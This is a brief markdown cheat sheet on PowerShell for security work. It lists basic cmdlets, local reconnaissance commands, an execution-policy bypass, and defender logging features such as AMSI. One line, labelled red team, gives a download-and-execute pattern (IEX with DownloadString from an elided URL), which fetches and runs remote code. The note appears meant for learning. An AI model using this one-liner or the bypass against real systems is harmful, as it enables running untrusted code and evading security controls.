---
tags: [windows,powershell,automation]
---

# PowerShell for Security
- Cmdlets: `Verb-Noun` (e.g. `Get-Process`, `Get-Service`, `Get-LocalUser`).
- `Get-ChildItem` (ls), `Select-Object`, `Where-Object`, `ForEach-Object`.
- **Recon:** `Get-NetTCPConnection`, `Get-NetIPAddress`, `Get-LocalGroupMember Administrators`.
- **Exec policy:** `Set-ExecutionPolicy Bypass -Scope Process`.
- **Download/exec (red team):** `IEX (New-Object Net.WebClient).DownloadString('http://...')`.
- **Logging to know:** Script Block Logging, Transcription, AMSI (defenders watch these).
